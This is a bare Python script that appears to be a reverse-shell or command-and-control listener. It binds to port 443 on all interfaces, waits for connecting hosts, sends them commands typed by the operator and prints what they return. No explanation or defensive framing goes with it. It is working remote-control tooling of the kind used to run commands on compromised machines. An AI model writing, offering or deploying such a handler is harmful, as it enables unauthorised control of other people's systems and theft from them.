import socket

HOST = "0.0.0.0"
PORT = 443

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    while(True):
        print("Listening ...")
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")
            cmd = input("Enter cmd ")
            cmd = cmd + '\n'
            cmdRequest = cmd.encode()
            conn.sendall(cmdRequest)
            cmdOutput = conn.recv(1024)
            print(cmdOutput)
